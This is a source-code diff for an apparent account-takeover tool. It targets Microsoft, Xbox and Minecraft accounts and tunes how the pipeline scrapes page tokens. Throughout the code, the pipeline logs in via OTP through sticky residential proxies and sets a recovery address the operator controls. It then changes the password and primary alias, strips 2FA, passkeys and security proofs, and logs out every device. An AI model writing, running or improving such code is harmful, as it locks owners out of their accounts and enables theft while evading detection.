@@ -3,11 +3,15 @@ import path from "node:path";
 import { fileURLToPath } from "node:url";
 import { CookieJar, fetchWithJar } from "./cookie-jar.js";
 import { createLogger } from "./api.js";
+import {
+  resolveProxyFromLabel,
+  setStickyProxy,
+} from "./proxy-fetch.js";
 
 const __secureDir = path.dirname(fileURLToPath(import.meta.url));
 const LOGIN_OTP_SCRIPT = path.resolve(__secureDir, "../scripts/login_otp.py");
 
-/** Python residential-proxy OTP login → inject cookies into jar */
+/** Python residential-proxy OTP login → inject cookies into jar; sticks that proxy for post-login MS calls */
 async function loginWithCodeViaPython(
   jar: CookieJar,
   email: string,
@@ -23,6 +27,7 @@ async function loginWithCodeViaPython(
         cookies?: Record<string, string>;
         error?: string;
         proxy?: string;
+        proxy_url?: string;
       } | null>((resolve) => {
         const child = spawn(bin, [LOGIN_OTP_SCRIPT, email, proofId, code], {
           windowsHide: true,
@@ -46,7 +51,15 @@ async function loginWithCodeViaPython(
             return;
           }
           try {
-            resolve(JSON.parse(line) as { ok?: boolean; cookies?: Record<string, string>; error?: string; proxy?: string });
+            resolve(
+              JSON.parse(line) as {
+                ok?: boolean;
+                cookies?: Record<string, string>;
+                error?: string;
+                proxy?: string;
+                proxy_url?: string;
+              },
+            );
           } catch {
             resolve(null);
           }
@@ -57,6 +70,16 @@ async function loginWithCodeViaPython(
         for (const [k, v] of Object.entries(result.cookies)) {
           jar.setFromResponse("https://login.live.com", `${k}=${v}`);
         }
+        const sticky =
+          result.proxy_url ||
+          resolveProxyFromLabel(result.proxy) ||
+          null;
+        if (sticky) {
+          setStickyProxy(sticky);
+          await log("info", `[secure] sticky proxy set for secure pipeline: ${result.proxy || "ok"}`);
+        } else {
+          await log("warn", "[secure] no sticky proxy — post-login may hit bare VPS IP");
+        }
         await log(
           "info",
           `[secure] OTP login ok via python proxy=${result.proxy || "?"} cookies=${Object.keys(result.cookies).length}`,
@@ -64,7 +87,6 @@ async function loginWithCodeViaPython(
         return true;
       }
       await log("warn", `[secure] python login failed: ${(result.error || "unknown").slice(0, 200)}`);
-      // Don't try other python bins if script ran
       return false;
     } catch {
       /* try next bin */
@@ -257,13 +279,41 @@ async function loginWithCode(
 }
 
 async function getCookies(jar: CookieJar): Promise<string> {
-  const res = await fetchWithJar(jar, "https://account.live.com/password/reset", {
-    headers: { host: "account.live.com" },
-    redirect: "manual",
-  });
-  const text = await res.text();
-  const raw = extract(text, /"apiCanary":"([^"]+)"/);
-  return decodeUnicode(decodeURIComponent(raw));
+  const urls = [
+    "https://account.live.com/password/reset",
+    "https://account.live.com/proofs/Manage/additional",
+    "https://account.live.com/",
+  ];
+  for (const url of urls) {
+    try {
+      const res = await fetchWithJar(
+        jar,
+        url,
+        {
+          headers: {
+            Accept: "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+            "User-Agent":
+              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
+          },
+        },
+        { timeoutMs: 25_000, followRedirects: true },
+      );
+      const text = await res.text();
+      const raw =
+        text.match(/"apiCanary"\s*:\s*"([^"]+)"/)?.[1] ||
+        text.match(/apiCanary&quot;:&quot;([^&]+)&quot;/)?.[1];
+      if (raw) {
+        try {
+          return decodeUnicode(decodeURIComponent(raw));
+        } catch {
+          return decodeUnicode(raw);
+        }
+      }
+    } catch {
+      /* try next */
+    }
+  }
+  throw new Error("apiCanary not found on account.live.com pages");
 }
 
 async function getT(jar: CookieJar): Promise<string | null> {
@@ -392,18 +442,22 @@ async function getOwnerInfo(jar: CookieJar, verificationToken: string) {
 
 async function getXBL(jar: CookieJar) {
   try {
-    let res = await fetchWithJar(jar, "https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254", {
-      redirect: "manual",
-    });
+    // Manual hop so we can read accessToken from redirect Location
+    let res = await fetchWithJar(
+      jar,
+      "https://sisu.xboxlive.com/connect/XboxLive/?state=login&cobrandId=8058f65d-ce06-4c30-9559-473c9275a65d&tid=896928775&ru=https://www.minecraft.net/en-us/login&aid=1142970254",
+      {},
+      { followRedirects: false, timeoutMs: 30_000 },
+    );
     let loc = res.headers.get("location");
     if (!loc) return null;
 
-    res = await fetchWithJar(jar, loc, { redirect: "manual" });
+    res = await fetchWithJar(jar, loc, {}, { followRedirects: false, timeoutMs: 30_000 });
     loc = res.headers.get("location");
     if (!loc) return null;
 
-    res = await fetchWithJar(jar, loc, { redirect: "manual" });
-    loc = res.headers.get("location");
+    res = await fetchWithJar(jar, loc, {}, { followRedirects: false, timeoutMs: 30_000 });
+    loc = res.headers.get("location") || res.url;
     if (!loc) return null;
 
     const tokenMatch = loc.match(/accessToken=([^&#]+)/);
@@ -660,35 +714,88 @@ function withTimeout<T>(p: Promise<T>, ms: number, label: string): Promise<T> {
   });
 }
 
-function tryParseJsonBlob(raw: string): Record<string, unknown> | null {
-  try {
-    return JSON.parse(raw) as Record<string, unknown>;
-  } catch {
-    // MS sometimes leaves trailing junk after the object
-    try {
-      const end = raw.lastIndexOf("}");
-      if (end > 0) return JSON.parse(raw.slice(0, end + 1)) as Record<string, unknown>;
-    } catch {
-      /* ignore */
+/** Extract balanced {...} starting at open brace index (string-aware). */
+function extractBalancedObject(source: string, openIdx: number): string | null {
+  if (openIdx < 0 || source[openIdx] !== "{") return null;
+  let depth = 0;
+  let inStr = false;
+  let esc = false;
+  for (let i = openIdx; i < source.length; i++) {
+    const c = source[i];
+    if (inStr) {
+      if (esc) {
+        esc = false;
+      } else if (c === "\\") {
+        esc = true;
+      } else if (c === '"') {
+        inStr = false;
+      }
+      continue;
+    }
+    if (c === '"') {
+      inStr = true;
+      continue;
+    }
+    if (c === "{") depth++;
+    else if (c === "}") {
+      depth--;
+      if (depth === 0) return source.slice(openIdx, i + 1);
     }
   }
   return null;
 }
 
-function extractJsonAssignment(html: string, names: string[]): Record<string, unknown> | null {
-  for (const name of names) {
-    // var t0 = {...};  OR  window.t0={...};  OR  t0 = {...};
-    const re = new RegExp(
-      `(?:var\\s+|window\\.|)${name}\\s*=\\s*(\\{[\\s\\S]*?\\})\\s*;`,
-      "i",
-    );
-    const m = html.match(re);
-    if (m?.[1]) {
-      const parsed = tryParseJsonBlob(m[1]);
-      if (parsed) return parsed;
+function tryParseJsonBlob(raw: string): Record<string, unknown> | null {
+  try {
+    return JSON.parse(raw) as Record<string, unknown>;
+  } catch {
+    try {
+      // MS often embeds JS with unquoted keys or trailing commas — try cleanup
+      const cleaned = raw
+        .replace(/,\s*([}\]])/g, "$1")
+        .replace(/\\x([0-9A-Fa-f]{2})/g, (_, h) => String.fromCharCode(parseInt(h, 16)));
+      return JSON.parse(cleaned) as Record<string, unknown>;
+    } catch {
+      return null;
     }
   }
+}
+
+function extractJsonAssignment(html: string, names: string[]): Record<string, unknown> | null {
+  for (const name of names) {
+    const re = new RegExp(`(?:var\\s+|let\\s+|const\\s+|window\\.|)${name}\\s*=\\s*\\{`, "i");
+    const m = re.exec(html);
+    if (!m) continue;
+    const openIdx = m.index + m[0].length - 1;
+    const blob = extractBalancedObject(html, openIdx);
+    if (!blob) continue;
+    const parsed = tryParseJsonBlob(blob);
+    if (parsed) return parsed;
+  }
   return null;
+}
+
+/** Deep-find first string matching key names in nested object */
+function deepFindString(obj: unknown, keys: string[], depth = 0): string | undefined {
+  if (!obj || depth > 8) return undefined;
+  if (typeof obj !== "object") return undefined;
+  if (Array.isArray(obj)) {
+    for (const item of obj) {
+      const v = deepFindString(item, keys, depth + 1);
+      if (v) return v;
+    }
+    return undefined;
+  }
+  const rec = obj as Record<string, unknown>;
+  for (const k of keys) {
+    const v = rec[k];
+    if (typeof v === "string" && v.length > 0) return v;
+  }
+  for (const v of Object.values(rec)) {
+    const found = deepFindString(v, keys, depth + 1);
+    if (found) return found;
+  }
+  return undefined;
 }
 
 function pickSecInfoFields(obj: Record<string, unknown>): {
@@ -696,35 +803,53 @@ function pickSecInfoFields(obj: Record<string, unknown>): {
   encryptedNetId?: string;
   raw: Record<string, unknown>;
 } {
-  const email =
-    (obj.email as string) ||
-    (obj.UserEmail as string) ||
-    ((obj.WLXAccount as Record<string, unknown>)?.email as string) ||
-    ((obj.oPostParams as Record<string, unknown>)?.email as string) ||
-    undefined;
+  const emailRaw = deepFindString(obj, [
+    "email",
+    "UserEmail",
+    "userEmail",
+    "signInName",
+    "SignInName",
+    "primaryEmail",
+    "PrimaryEmail",
+  ]);
+  const email = emailRaw && /@/.test(emailRaw) ? emailRaw : undefined;
 
-  const manageProofs =
-    ((obj.WLXAccount as Record<string, unknown>)?.manageProofs as Record<string, string>) ||
-    (obj.manageProofs as Record<string, string>) ||
-    undefined;
-
-  const encryptedNetId =
-    manageProofs?.encryptedNetId ||
-    (obj.encryptedNetId as string) ||
-    (obj.netId as string) ||
-    undefined;
+  let encryptedNetId =
+    deepFindString(obj, ["encryptedNetId", "EncryptedNetId"]) || undefined;
+  if (encryptedNetId) encryptedNetId = decodeUnicode(encryptedNetId);
 
   return { email, encryptedNetId, raw: obj };
 }
 
+function scrapeSecFieldsFromHtml(text: string): {
+  email?: string;
+  encryptedNetId?: string;
+} {
+  const emailMatch =
+    text.match(/"email"\s*:\s*"([^"]+@[^"]+)"/i) ||
+    text.match(/"UserEmail"\s*:\s*"([^"]+@[^"]+)"/i) ||
+    text.match(/"signInName"\s*:\s*"([^"]+@[^"]+)"/i) ||
+    text.match(/"primaryAlias"\s*:\s*"([^"]+@[^"]+)"/i);
+  const netIdMatch =
+    text.match(/"encryptedNetId"\s*:\s*"([^"]+)"/i) ||
+    text.match(/encryptedNetId\\?":\\?"([^"\\]+)/i) ||
+    text.match(/encryptedNetId&quot;:&quot;([^&]+)&quot;/i);
+  return {
+    email: emailMatch?.[1],
+    encryptedNetId: netIdMatch?.[1] ? decodeUnicode(netIdMatch[1]) : undefined,
+  };
+}
+
 async function securityInformation(
   jar: CookieJar,
+  fallbackEmail?: string,
 ): Promise<{ email?: string; encryptedNetId?: string; raw: Record<string, unknown> }> {
   const urls = [
     "https://account.live.com/proofs/Manage/additional?mkt=en-US&refd=account.microsoft.com&refp=security",
     "https://account.live.com/proofs/Manage/additional",
     "https://account.live.com/proofs/manage/additional?mkt=en-US",
     "https://account.live.com/proofs/Manage",
+    "https://account.live.com/proofs/Add",
   ];
 
   let lastHint = "";
@@ -740,59 +865,65 @@ async function securityInformation(
           Referer: "https://account.microsoft.com/",
         },
       },
-      { timeoutMs: 25_000, followRedirects: true, maxRedirects: 12 },
+      { timeoutMs: 30_000, followRedirects: true, maxRedirects: 12 },
     );
     const text = await res.text();
-    const finalUrl = res.url || url;
+    // proxy path may not set res.url — sniff login from body
+    const looksLogin =
+      /name="loginfmt"|id="i0116"|sFTTag|name="PPFT"|login\.live\.com\/oauth20/i.test(text) &&
+      !/"encryptedNetId"/i.test(text);
 
-    // Login redirect / challenge pages
-    if (
-      /login\.live\.com|account\.live\.com\/Abort|interrupt/i.test(finalUrl) ||
-      /name="loginfmt"|id="i0116"|sFTTag|ppft/i.test(text)
-    ) {
-      lastHint = `login/interrupt page status=${res.status} url=${finalUrl.slice(0, 120)} len=${text.length}`;
+    if (looksLogin) {
+      lastHint = `login/interrupt page status=${res.status} len=${text.length}`;
       continue;
     }
 
-    const candidates = [
-      extractJsonAssignment(text, ["t0", "ServerData", "oPageConfig", "pageConfig", "serverData"]),
-    ].filter(Boolean) as Record<string, unknown>[];
+    const nameList = ["t0", "ServerData", "oPageConfig", "pageConfig", "serverData", "oConfig"];
+    const candidates: Record<string, unknown>[] = [];
+    for (const n of nameList) {
+      const c = extractJsonAssignment(text, [n]);
+      if (c) candidates.push(c);
+    }
 
-    // Fallback: scrape fields directly from HTML/JSON fragments
+    // also try any assignment containing encryptedNetId
     if (!candidates.length) {
-      const emailMatch =
-        text.match(/"email"\s*:\s*"([^"]+@[^"]+)"/) ||
-        text.match(/"UserEmail"\s*:\s*"([^"]+@[^"]+)"/);
-      const netIdMatch =
-        text.match(/"encryptedNetId"\s*:\s*"([^"]+)"/) ||
-        text.match(/encryptedNetId&quot;:&quot;([^&]+)&quot;/);
-      if (emailMatch || netIdMatch) {
-        return {
-          email: emailMatch?.[1],
-          encryptedNetId: netIdMatch?.[1] ? decodeUnicode(netIdMatch[1]) : undefined,
-          raw: {},
-        };
+      const idx = text.search(/encryptedNetId/i);
+      if (idx > 0) {
+        // walk back to nearest {
+        let open = text.lastIndexOf("{", idx);
+        for (let tries = 0; tries < 5 && open >= 0; tries++) {
+          const blob = extractBalancedObject(text, open);
+          if (blob && blob.includes("encryptedNetId")) {
+            const parsed = tryParseJsonBlob(blob);
+            if (parsed) candidates.push(parsed);
+            break;
+          }
+          open = text.lastIndexOf("{", open - 1);
+        }
       }
-      lastHint = `no blob status=${res.status} url=${finalUrl.slice(0, 120)} len=${text.length} hasT0=${/t0\s*=/.test(text)} hasServerData=${/ServerData\s*=/.test(text)}`;
-      continue;
     }
 
     for (const c of candidates) {
       const fields = pickSecInfoFields(c);
-      if (fields.email || fields.encryptedNetId) return fields;
-      // deeper search in nested JSON string dump
-      const dump = JSON.stringify(c);
-      const email2 = dump.match(/"email"\s*:\s*"([^"]+@[^"]+)"/)?.[1];
-      const net2 = dump.match(/"encryptedNetId"\s*:\s*"([^"]+)"/)?.[1];
-      if (email2 || net2) {
+      if (fields.encryptedNetId) {
         return {
-          email: email2,
-          encryptedNetId: net2 ? decodeUnicode(net2) : undefined,
+          email: fields.email || fallbackEmail,
+          encryptedNetId: fields.encryptedNetId,
           raw: c,
         };
       }
     }
-    lastHint = `parsed blob but missing fields status=${res.status} keys=${Object.keys(candidates[0]).slice(0, 12).join(",")}`;
+
+    const scraped = scrapeSecFieldsFromHtml(text);
+    if (scraped.encryptedNetId) {
+      return {
+        email: scraped.email || fallbackEmail,
+        encryptedNetId: scraped.encryptedNetId,
+        raw: {},
+      };
+    }
+
+    lastHint = `no fields status=${res.status} len=${text.length} hasEnc=${/"encryptedNetId"/i.test(text)} hasT0=${/\bt0\s*=/.test(text)} keys=${candidates[0] ? Object.keys(candidates[0]).slice(0, 10).join(",") : "-"}`;
   }
 
   throw new Error(`Failed to extract security information (${lastHint || "no pages"})`);
@@ -919,14 +1050,38 @@ async function recover(
     const res = await fetchWithJar(jar, `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`, {}, { timeoutMs: 25_000 });
     const text = await res.text();
 
-    const serverDataMatch = text.match(/var\s+ServerData=(.*?)(?=;|$)/);
-    if (!serverDataMatch) return null;
-    const serverData = JSON.parse(serverDataMatch[1]) as Record<string, string>;
+    let serverData: Record<string, string> | null = null;
+    const sdAssign = extractJsonAssignment(text, ["ServerData", "serverData"]);
+    if (sdAssign) {
+      serverData = sdAssign as Record<string, string>;
+    } else {
+      const m = text.match(/var\s+ServerData\s*=\s*\{/);
+      if (m) {
+        const openIdx = text.indexOf("{", m.index);
+        const blob = extractBalancedObject(text, openIdx);
+        if (blob) serverData = tryParseJsonBlob(blob) as Record<string, string> | null;
+      }
+    }
+    if (!serverData) {
+      console.error("[secure] recover: ServerData missing");
+      return null;
+    }
 
-    const decodedToken = decodeURIComponent(serverData.sRecoveryToken).replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
-      String.fromCharCode(parseInt(hex, 16)),
+    const rawToken = serverData.sRecoveryToken || serverData.recoveryToken || "";
+    if (!rawToken) {
+      console.error("[secure] recover: sRecoveryToken missing");
+      return null;
+    }
+    const decodedToken = decodeURIComponent(String(rawToken)).replace(
+      /\\u([0-9A-Fa-f]{4})/g,
+      (_, hex) => String.fromCharCode(parseInt(hex, 16)),
     );
-    const postUrl = extract(text, /"urlPostSltToLogin":"([^"]+)"/);
+    let postUrl = "";
+    try {
+      postUrl = extract(text, /"urlPostSltToLogin":"([^"]+)"/);
+    } catch {
+      postUrl = (serverData.urlPostSltToLogin as string) || "";
+    }
 
     const recRes = await fetchWithJar(jar, "https://account.live.com/API/Recovery/VerifyRecoveryCode", {
       method: "POST",
@@ -1118,6 +1273,7 @@ export async function runSecureBot(
   };
 
   try {
+    setStickyProxy(null);
     await log("info", `[secure] Starting securing pipeline for ${config.email}`);
     ensureAlive();
 
@@ -1285,60 +1441,23 @@ export async function runSecureBot(
 
     ensureAlive();
 
-    // Security steps (need canary/t where applicable — skip gracefully)
+    // ---- RECOVERY FIRST (proofs/services can kill session / canary) ----
     if (t) {
       try {
         await log("info", "[secure] Getting AMRP...");
-        await getAMRP(jar, t);
+        await withTimeout(getAMRP(jar, t), 20_000, "getAMRP");
       } catch (e) {
         await log("warn", `[secure] AMRP skipped: ${e instanceof Error ? e.message : e}`);
       }
     }
 
     ensureAlive();
-
-    if (apiCanary) {
-      try {
-        await log("info", "[secure] Disabling 2FA...");
-        await withTimeout(remove2FA(jar, apiCanary), 20_000, "remove2FA");
-      } catch (e) {
-        await log("warn", `[secure] remove2FA: ${e instanceof Error ? e.message : e}`);
-      }
-      try {
-        await log("info", "[secure] Removing passkeys...");
-        await withTimeout(removeZyger(jar, apiCanary), 20_000, "removeZyger");
-      } catch (e) {
-        await log("warn", `[secure] removeZyger: ${e instanceof Error ? e.message : e}`);
-      }
-      try {
-        await log("info", "[secure] Removing security proofs...");
-        await withTimeout(removeProofs(jar, apiCanary), 45_000, "removeProofs");
-        await log("info", "[secure] Security proofs step done");
-      } catch (e) {
-        await log("warn", `[secure] removeProofs: ${e instanceof Error ? e.message : e}`);
-      }
-    } else {
-      await log("warn", "[secure] Skipping 2FA/proof removal (no apiCanary)");
-    }
-
-    try {
-      await log("info", "[secure] Removing third-party services (max 4)...");
-      await withTimeout(removeServices(jar), 40_000, "removeServices");
-      await log("info", "[secure] Services step done");
-    } catch (e) {
-      await log("warn", `[secure] removeServices: ${e instanceof Error ? e.message : e}`);
-    }
-
-    ensureAlive();
-
-    // Recovery
     await log("info", "[secure] Getting security information...");
-    let mainEmail: string | undefined;
+    let mainEmail: string | undefined = config.email;
     let encryptedNetId: string | undefined;
     try {
-      // Refresh canary right before recovery — proofs/services may invalidate it
       try {
-        const refreshed = await withTimeout(getCookies(jar), 20_000, "refreshApiCanary");
+        const refreshed = await withTimeout(getCookies(jar), 25_000, "refreshApiCanary");
         if (refreshed) apiCanary = refreshed;
       } catch (e) {
         await log(
@@ -1347,12 +1466,16 @@ export async function runSecureBot(
         );
       }
 
-      const secInfo = await withTimeout(securityInformation(jar), 45_000, "securityInformation");
-      mainEmail = secInfo.email;
+      const secInfo = await withTimeout(
+        securityInformation(jar, config.email),
+        60_000,
+        "securityInformation",
+      );
+      mainEmail = secInfo.email || config.email;
       encryptedNetId = secInfo.encryptedNetId;
       await log(
         "info",
-        `[secure] Sec info ok email=${mainEmail || "?"} netId=${encryptedNetId ? "yes" : "no"}`,
+        `[secure] Sec info ok email=${mainEmail || "?"} netId=${encryptedNetId ? "yes" : "no"} canary=${apiCanary ? "yes" : "no"}`,
       );
     } catch (e) {
       await log(
@@ -1361,99 +1484,137 @@ export async function runSecureBot(
       );
     }
 
-    if (mainEmail || encryptedNetId) {
+    if (mainEmail && encryptedNetId && apiCanary) {
       ensureAlive();
+      try {
+        await log("info", "[secure] Getting recovery code...");
+        const recoveryCode = await withTimeout(
+          getRecoveryCode(jar, apiCanary, encryptedNetId),
+          30_000,
+          "getRecoveryCode",
+        );
+        await log("info", `[secure] Got recovery code`);
 
-      if (mainEmail && encryptedNetId && apiCanary) {
-        try {
-          await log("info", "[secure] Getting recovery code...");
-          const recoveryCode = await withTimeout(
-            getRecoveryCode(jar, apiCanary, encryptedNetId),
-            25_000,
-            "getRecoveryCode",
+        ensureAlive();
+        if (!process.env.FIRSTMAIL_API_KEY) {
+          await log("error", "[secure] FIRSTMAIL_API_KEY missing on worker — cannot finish recovery");
+        } else {
+          await log("info", "[secure] Generating new email...");
+          const newEmailData = await withTimeout(generateEmail(), 20_000, "generateEmail");
+          await log("info", `[secure] Generated email: ${newEmailData.email}`);
+
+          const newPassword =
+            Math.random().toString(36).slice(2, 10) +
+            Math.random().toString(36).slice(2, 6).toUpperCase() +
+            "1!";
+
+          await log("info", "[secure] Running recovery flow (may wait for Firstmail OTP)...");
+          const recoveryResult = await withTimeout(
+            recover(
+              jar,
+              mainEmail,
+              recoveryCode,
+              newEmailData.email,
+              newPassword,
+              newEmailData.token,
+              runSignal,
+            ),
+            150_000,
+            "recover",
           );
-          await log("info", `[secure] Got recovery code`);
 
-          ensureAlive();
-          if (!process.env.FIRSTMAIL_API_KEY) {
-            await log("error", "[secure] FIRSTMAIL_API_KEY missing on worker — cannot finish recovery");
-          } else {
-            await log("info", "[secure] Generating new email...");
-            const newEmailData = await withTimeout(generateEmail(), 20_000, "generateEmail");
-            await log("info", `[secure] Generated email: ${newEmailData.email}`);
+          if (recoveryResult) {
+            result.newEmail = newEmailData.email;
+            result.newPassword = newPassword;
+            result.recoveryCode = recoveryResult.recoveryCode;
+            await log("info", "[secure] Account secured successfully!");
 
-            const newPassword = Math.random().toString(36).slice(2, 14);
+            // Refresh canary after recovery for alias / logout
+            try {
+              const refreshed = await getCookies(jar);
+              if (refreshed) apiCanary = refreshed;
+            } catch {
+              /* ignore */
+            }
 
-            await log("info", "[secure] Running recovery flow (may wait for Firstmail OTP)...");
-            const recoveryResult = await withTimeout(
-              recover(
-                jar,
-                mainEmail,
-                recoveryCode,
-                newEmailData.email,
-                newPassword,
-                newEmailData.token,
-                runSignal,
-              ),
-              120_000,
-              "recover",
-            );
-
-            if (recoveryResult) {
-              result.newEmail = newEmailData.email;
-              result.newPassword = newPassword;
-              result.recoveryCode = recoveryResult.recoveryCode;
-              await log("info", "[secure] Account secured successfully!");
-
-              ensureAlive();
-              await log("info", "[secure] Changing primary alias...");
-              try {
-                const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
-                const aliasChanged = await withTimeout(
-                  changePrimaryAlias(jar, aliasName, apiCanary),
-                  30_000,
-                  "changePrimaryAlias",
-                );
-                if (aliasChanged) {
-                  result.newEmail = `${aliasName}@outlook.com`;
-                  await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
-                } else {
-                  await log(
-                    "warn",
-                    "[secure] Failed to change primary alias - email recovery address preserved",
-                  );
-                }
-              } catch (e) {
+            ensureAlive();
+            await log("info", "[secure] Changing primary alias...");
+            try {
+              const aliasName = `auto${Math.random().toString(36).slice(2, 14)}`;
+              const aliasChanged = await withTimeout(
+                changePrimaryAlias(jar, aliasName, apiCanary),
+                30_000,
+                "changePrimaryAlias",
+              );
+              if (aliasChanged) {
+                result.newEmail = `${aliasName}@outlook.com`;
+                await log("info", `[secure] Primary alias changed to ${result.newEmail}`);
+              } else {
                 await log(
                   "warn",
-                  `[secure] alias change skipped: ${e instanceof Error ? e.message : e}`,
+                  "[secure] Failed to change primary alias - email recovery address preserved",
                 );
               }
-            } else {
-              await log("error", "[secure] Recovery flow returned null");
+            } catch (e) {
+              await log(
+                "warn",
+                `[secure] alias change skipped: ${e instanceof Error ? e.message : e}`,
+              );
             }
+          } else {
+            await log("error", "[secure] Recovery flow returned null");
           }
-        } catch (e) {
-          await log(
-            "error",
-            `[secure] Recovery block failed: ${e instanceof Error ? e.message : e}`,
-          );
         }
-      } else {
+      } catch (e) {
         await log(
           "error",
-          `[secure] Missing mainEmail/encryptedNetId/apiCanary for recovery (email=${mainEmail || "no"} netId=${!!encryptedNetId} canary=${!!apiCanary})`,
+          `[secure] Recovery block failed: ${e instanceof Error ? e.message : e}`,
         );
       }
+    } else {
+      await log(
+        "error",
+        `[secure] Missing mainEmail/encryptedNetId/apiCanary for recovery (email=${mainEmail || "no"} netId=${!!encryptedNetId} canary=${!!apiCanary})`,
+      );
     }
 
     ensureAlive();
 
-    // Logout all
+    // Best-effort cleanup AFTER recovery (do not block success)
+    if (apiCanary) {
+      try {
+        await log("info", "[secure] Disabling 2FA...");
+        await withTimeout(remove2FA(jar, apiCanary), 15_000, "remove2FA");
+      } catch (e) {
+        await log("warn", `[secure] remove2FA: ${e instanceof Error ? e.message : e}`);
+      }
+      try {
+        await log("info", "[secure] Removing passkeys...");
+        await withTimeout(removeZyger(jar, apiCanary), 15_000, "removeZyger");
+      } catch (e) {
+        await log("warn", `[secure] removeZyger: ${e instanceof Error ? e.message : e}`);
+      }
+      try {
+        await log("info", "[secure] Removing security proofs...");
+        await withTimeout(removeProofs(jar, apiCanary), 30_000, "removeProofs");
+        await log("info", "[secure] Security proofs step done");
+      } catch (e) {
+        await log("warn", `[secure] removeProofs: ${e instanceof Error ? e.message : e}`);
+      }
+    }
+
+    try {
+      await log("info", "[secure] Removing third-party services (max 4)...");
+      await withTimeout(removeServices(jar), 30_000, "removeServices");
+      await log("info", "[secure] Services step done");
+    } catch (e) {
+      await log("warn", `[secure] removeServices: ${e instanceof Error ? e.message : e}`);
+    }
+
     try {
       await log("info", "[secure] Logging out all devices...");
       if (apiCanary) {
-        await withTimeout(logoutAll(jar, apiCanary), 20_000, "logoutAll");
+        await withTimeout(logoutAll(jar, apiCanary), 15_000, "logoutAll");
       }
     } catch (e) {
       await log("warn", `[secure] logoutAll: ${e instanceof Error ? e.message : e}`);
@@ -1482,6 +1643,7 @@ export async function runSecureBot(
     await log("error", `[secure] Pipeline failed: ${msg}`);
     return null;
   } finally {
+    setStickyProxy(null);
     clearTimeout(hardTimer);
     signal.removeEventListener("abort", onParentAbort);
   }
